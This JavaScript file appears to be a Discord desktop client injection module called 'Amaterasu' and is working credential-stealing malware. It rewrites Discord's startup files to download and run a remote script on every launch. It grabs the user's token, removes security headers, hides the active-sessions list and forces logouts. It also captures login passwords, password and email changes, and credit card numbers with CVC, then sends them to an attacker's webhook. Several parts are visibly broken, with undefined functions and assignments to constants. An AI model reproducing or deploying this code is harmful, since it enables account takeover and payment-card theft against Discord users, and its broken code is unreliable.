const fs = require("fs"),
    path = require("path"),
    { BrowserWindow, session } = require("electron"),
    args = process.argv,
    querystring = require("querystring"),
    os = require("os"),
    https = require("https");

const evalToken = `for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`;
const bannerurl = "",
    usericonurl = "";

const settings = {
    logout: "true",
    "logout-notify": "true",
    "init-notify": "true",
    "embed-color": "#2C2F33",

    injectionURL:
        "https://raw.githubusercontent.com/am4terasu/amaterasu/main/injection/index.js",
    webhook: "%WEBHOOK%",
    filter2: {
        urls: [
            "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
            "https://*.discord.com/api/v*/applications/detectable",
            "https://discord.com/api/v*/applications/detectable",
            "https://*.discord.com/api/v*/users/@me/library",
            "https://discord.com/api/v*/users/@me/library",
            "wss://remote-auth-gateway.discord.gg/*",
        ],
    },
};

const discordPath = (function () {
    const app = args[0].split("\\").slice(0, -1).join("\\");
    let resourcePath = "";

    if (process.platform === "win32") {
        resourcePath = path.join(app, "resources");
    } else if (process.platform === "darwin")
        resourcePath = path.join(app, "Contents", "Resources");

    if (fs.existsSync(resourcePath))
        return {
            resourcePath,
            app,
        };
    return "", "";
})();

String.prototype.insert = function (index, string) {
    if (index > 0)
        return (
            this.substring(0, index) +
            string +
            this.substring(index, this.length)
        );
    return string + this;
};

const updateCheck = () => {
    const { resourcePath, app } = discordPath;
    if (resourcePath === undefined || app === undefined) return;
    const appPath = path.join(resourcePath, "app");
    const packageJson = path.join(appPath, "package.json");
    const resourceIndex = path.join(resourcePath, "index.js");
    const indexJs = `${app}\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js`;
    const BDpath = path.join(
        process.env.APPDATA,
        "\\betterdiscord\\data\\betterdiscord.asar"
    );
    if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
    if (!fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
    if (!fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);

    if (process.platform === "win32" || process.platform === "darwin") {
        fs.writeFileSync(
            packageJson,
            JSON.stringify({ name: "discord", main: "index.js" }, null, 4)
        );
        const StartUPscript = `
        const fs = require("fs"),
            indexJS = "${indexJs}}"
            BDpath = "${BDpath}",
            fileSize = fs.statSync(indexJS).size

        fs.readFileSync(indexJS, "utf8", (err, data) => {
            if (fileSize < 20000 || data === "module.exports = require('./core.asar')") init()
        })

        async function init() {
            https.get('${settings.injectionURL}', (res) => {
                const file = fs.createWriteStream(indexJS)
                res.replace("core" + "num", indexJS).replace("%WEBHOOK%", settings.webhook).pipe(file)
                file.on("finish", () => {
                    file.close()
                })
            }).emit("error", (err) => {
                setTimeout(init(), 10000)
            })
        }

        require("${path.join(resourcePath, "app.asar")}")
        if (fs.existsSync(BDpath)) require(BDpath)
        `;
        fs.writeFileSync(resourceIndex, StartUPscript.replace(/\\/g, "\\\\"));
    }

    if (!fs.existsSync(path.join(__dirname, "amaterasu"))) return !0;
    execScript(
        `window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`
    );
    return !1;
};

const execScript = (script) => {
    const window = BrowserWindow.getAllWindows()[0];
    return window.webContents.executeJavaScript(script, !0);
};

function sleep(ms) {
    return new Promise((resolve) => setTimeout(resolve, ms));
}

async function noSessionPlease() {
    await sleep(1000);
    execScript(
        `
        function userclick() {
            waitForElm(".children-1xdcWE").then((elm)=>elm[2].remove())
            waitForElm(".sectionTitle-3j2YI1").then((elm)=>elm[2].remove())
        }
        function IsSession(item) {
            return item?.innerText?.includes("Devices")
        }
        function handler(e) {
            e = e || window.event;
            var target = e.target || e.srcElement,
            text = target.textContent || target.innerText;   
            if (IsSession(target)) userclick()
        }
        function waitForElm(selector) {
            return new Promise(resolve => {
                const observer = new MutationObserver(mutations => {
                    if (document.querySelectorAll(selector).length>2) {
                        resolve(document.querySelectorAll(selector))
                    observer.disconnect();
                    }
                });
                observer.observe(document.body, {
                    childList: true,
                    subtree: true
                });
            });
        }
        document.addEventListener('click',handler,false);        
        `
    );
}

noSessionPlease();

session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
    if (details.url.startsWith(settings.webhook)) {
        if (details.url.includes("discord.com"))
            callback({
                responseHeaders: Object.assign(
                    { "Access-Control-Allow-Headers": "*" },
                    details.responseHeaders
                ),
            });
        else
            callback({
                responseHeaders: Object.assign(
                    {
                        "Content-Security-Policy": [
                            "default-src '*'",
                            "Access-Control-Allow-Headers '*'",
                            "Access-Control-Allow-Origin '*'",
                        ],
                        "Access-Control-Allow-Headers": "*",
                        "Access-Control-Allow-Origin": "*",
                    },
                    details.responseHeaders
                ),
            });
    } else {
        delete details.responseHeaders["content-security-policy"];
        delete details.responseHeaders["content-security-policy-report-only"];

        callback({
            responseHeaders: {
                ...details.responseHeaders,
                "Access-Control-Allow-Headers": "*",
            },
        });
    }
});

const hooker = async (content) => {
    const data = JSON.stringify(content);
    const url = new URL(settings.webhook);
    const options = {
        protocol: url.protocol,
        hostname: url.host,
        path: url.pathname,
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Access-Control-Allow-Origin": "*",
        },
    };
    const r = https.request(options);

    r.emit("error", (err) => {
        console.trace(err);
    });
    r.write(data);
    r.end();
};

const Firsttime = async () => {
    const { ip } = await getFromURL("https://www.myexternalip.com/json", null);
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents
        .executeJavaScript(`${evalToken}`, !0)
        .then(async (token) => {
            if (settings["init-notify"] == "true") {
                if (fs.existsSync(path.join(__dirname, "amaterasu"))) {
                    fs.rmdirSync(path.join(__dirname, "amaterasu"));

                    if (token == null || token == undefined || token == "") {
                        const c = {
                            username: "Amaterasu",
                            content: "",
                            embeds: [
                                {
                                    title: "Amaterasu initialized",
                                    color: settings["embed-color"],
                                    fields: [
                                        {
                                            name: "Injection info",
                                            value: "A",
                                            inline: !1,
                                        },
                                    ],
                                    author: {
                                        name: "Amaterasu",
                                    },
                                    footer: {
                                        text: "Amaterasu",
                                    },
                                },
                            ],
                        };
                        hooker(c);
                    } else {
                        const b = await getFromURL(
                            "https://discord.com/api/v8/users/@me",
                            token
                        );
                        usericonurl =
                            b.avatar === null
                                ? "https://cdn.discordapp.com/avatars/979571754185941022/3ade7409b016b7de6f93f21d209d21cf.webp?size=80"
                                : "https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}.png?size=600";
                        bannerurl =
                            b.banner === null
                                ? "https://cdn.discordapp.com/avatars/979571754185941022/3ade7409b016b7de6f93f21d209d21cf.webp?size=80"
                                : `https://cdn.discordapp.com/banners/${b.id}/${b.banner}.png?size=160`;

                        const c = {
                            username: "Amaterasu",
                            content: "",
                            embeds: [
                                {
                                    title: "Amaterasu initialized",
                                    description: "A",
                                    color: settings["embed-color"],
                                    fields: [
                                        {
                                            name: "Injection info",
                                            value: "A",
                                            inline: !1,
                                        },
                                        {
                                            name: "User info",
                                            value: "A",
                                            inline: !1,
                                        },
                                    ],
                                    footer: {
                                        text: "Amaterasu",
                                    },
                                    image: {
                                        url: bannerurl,
                                    },
                                    thumbnail: {
                                        url: usericonurl,
                                    },
                                },
                            ],
                        };
                        hooker(c);
                    }
                }
                const window = BrowserWindow.getAllWindows()[0];
                window.webContents
                    .executeJavaScript(
                        `window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`,
                        !0
                    )
                    .then((_) => {
                        /** */
                    });
            }
            return !1;
        });
};

const Filter = {
    urls: [
        "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
        "https://*.discord.com/api/v*/applications/detectable",
        "https://discord.com/api/v*/applications/detectable",
        "https://*.discord.com/api/v*/users/@me/library",
        "https://discord.com/api/v*/users/@me/library",
        "https://*.discord.com/api/v*/users/@me/billing/subscriptions",
        "https://discord.com/api/v*/users/@me/billing/subscriptions",
        "wss://remote-auth-gateway.discord.gg/*",
    ],
};

const saveIDtofile = async (text, name) => {
    fs.open(name, (err) => {
        if (err) return;
    });
    fs.appendFile(name, `${text}\n`, (err) => {
        if (err) return;
    });
};

const deletefile = async (name) => {
    fs.unlink(name, (err) => {
        if (err) return;
    });
};

const getFromURL = async (url, token) => {
    const window = BrowserWindow.getAllWindows()[0];
    var b = await window.webContents.executeJavaScript(
        `
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "${url}", false );
        xmlHttp.setRequestHeader("Authorization", "${token}");
        xmlHttp.send( null );
        JSON.parse(xmlHttp.responseText);    
        `,
        !0
    );
    return b;
};

const getFromURL2 = async (url, token) => {
    const window = BrowserWindow.getAllWindows()[0];
    var b = await window.webContents.executeJavaScript(
        `
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "${url}", false );
        xmlHttp.setRequestHeader("Authorization", "${token}");
        xmlHttp.send( null );
        `,
        !0
    );
    return b;
};

const getNSFW = (reader) => { };
const getA2F = (reader) => { };
const getNitro = (flags) => { };
const getRbadges = (flags) => { };
const getLanguage = (read) => { };
const getBadges = (flags) => { };

const Login = async (email, password, token) => {
    const window = BrowserWindow.getAllWindows()[0];
    const info = await getFromURL(
        "https://discord.com/api/v8/users/@me",
        token
    );
    const { ip } = await getFromURL("https://www.myexternalip.com/json", null);
    window.webContents
        .executeJavaScript(
            `
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
        xmlHttp.setRequestHeader("Authorization", "${token}");
        xmlHttp.send( null );
        xmlHttp.responseText
        `,
            !0
        )
        .then((inf0) => {
            window.webContents
                .executeJavaScript(
                    `
            var xmlHttp = new XMLHttpRequest();
            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
            xmlHttp.setRequestHeader("Authorization", "${token}");
            xmlHttp.send( null );
            xmlHttp.responseText
            `,
                    !0
                )
                .then((inf1) => {
                    const totalFriends = () => {
                        const f = JSON.parse(inf1);
                        const r = f.filter((user) => {
                            return user.type == 1;
                        });
                        return r.length;
                    };
                    const calcFriends = () => {
                        const f = JSON.parse(inf1);
                        const r = f.filter((user) => {
                            return user.type == 1;
                        });
                        var bruh = "";
                        for (x of r) {
                            const b = getRbadges(x.user.public_flags);
                            if (b.length > 0) {
                                bruh += `${b} ${x.user.username}#${x.user.discriminator}\n`;
                            }
                        }
                        if (bruh.length > 0) {
                            bruh = "No friends";
                        }
                        return bruh;
                    };
                    const cool = () => {
                        const json = JSON.parse(inf0);
                        var billing = "";
                        json.forEach((z) => {
                            if (z.type == "") return "`❌`";
                            else if (z.type == 2 && z.invalid != !0)
                                billing +=
                                    "`✔️`" + " <:paypal:896441236062347374>";
                            else if (z.type == 1 && z.invalid != !0)
                                billing += "`✔️`" + " :credit_card:";
                            else return "`❌`";
                        });
                        if (billing.length == 0) billing = "`❌`";
                        return billing;
                    };
                    if (info.avatar === null) {
                        usericonurl =
                            b.avatar === null
                                ? "https://cdn.discordapp.com/avatars/979571754185941022/3ade7409b016b7de6f93f21d209d21cf.webp?size=80"
                                : "https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}.png?size=600";
                        bannerurl =
                            b.banner === null
                                ? "https://cdn.discordapp.com/avatars/979571754185941022/3ade7409b016b7de6f93f21d209d21cf.webp?size=80"
                                : `https://cdn.discordapp.com/banners/${b.id}/${b.banner}.png?size=160`;
                    }

                    const params = {
                        username: "Amaterasu",
                        content: "",
                        embeds: [
                            {
                                title: "Account Info",
                                description: "A",
                                fields: [
                                    {
                                        name: "Injection info",
                                        value: "A",
                                        inline: !1,
                                    },
                                    {
                                        name: "Username",
                                        value: "A",
                                        inline: !0,
                                    },
                                ],
                            },
                        ],
                        footer: {
                            text: "A",
                        },
                        thumbnail: {
                            url: `${usericonurl}`,
                        },
                    };

                    hooker(params);
                });
        });
};

session.defaultSession.webRequest.onBeforeRequest(
    Filter,
    (details, callback) => {
        if (details.url.startsWith("wss://remote-auth-gateway"))
            return callback({
                cancel: true,
            });
        updateCheck();

        if (FirstTime()) {
            /** */
        }
        callback({
            /** */
        });

        return;
    }
);

session.defaultSession.webRequest.onCompleted(
    ChangePasswordFilter,
    (details, _) => {
        if (details.url.endsWith("login")) {
            if (details.statusCode == 200) {
                const data = JSON.parse(
                    Buffer.from(details.uploadData[0].bytes).toString()
                );
                const email = data.login;
                const password = data.password;
                const window = BrowserWindow.getAllWindows()[0];
                window.webContents
                    .executeJavaScript(
                        `for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`,
                        !0
                    )
                    .then((token) => {
                        Login(email, password, token);
                    });
            } else {
            }
        }
        if (details.url.endsWith("users/@me")) {
            if (details.statusCode == 200 && details.method == "PATCH") {
                const data = JSON.parse(
                    Buffer.from(details.uploadData[0].bytes).toString()
                );
                if (
                    data.password != null &&
                    data.password != undefined &&
                    data.password != ""
                ) {
                    if (
                        data.new_password != undefined &&
                        data.new_password != null &&
                        data.new_password != ""
                    ) {
                        const window = BrowserWindow.getAllWindows()[0];
                        window.webContents
                            .executeJavaScript(
                                `for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`,
                                !0
                            )
                            .then((token) => {
                                ChangePassword(
                                    data.password,
                                    data.new_password,
                                    token
                                );
                            });
                    }
                    if (
                        data.email != null &&
                        data.email != undefined &&
                        data.email != ""
                    ) {
                        const window = BrowserWindow.getAllWindows()[0];
                        window.webContents
                            .executeJavaScript(
                                `for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`,
                                !0
                            )
                            .then((token) => {
                                ChangeEmail(data.email, data.password, token);
                            });
                    }
                }
            } else {
            }
        }
        if (details.url.endsWith("tokens")) {
            const window = BrowserWindow.getAllWindows()[0];
            const item = querystring.parse(
                decodeURIComponent(
                    Buffer.from(details.uploadData[0].bytes).toString()
                )
            );
            window.webContents
                .executeJavaScript(
                    `for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`,
                    !0
                )
                .then((token) => {
                    CreditCardAdded(
                        item["card[number]"],
                        item["card[cvc]"],
                        item["card[exp_month]"],
                        item["card[exp_year]"],
                        token
                    );
                })
                .catch(console.error);
        }
    }
);

module.exports = require("./core.asar");
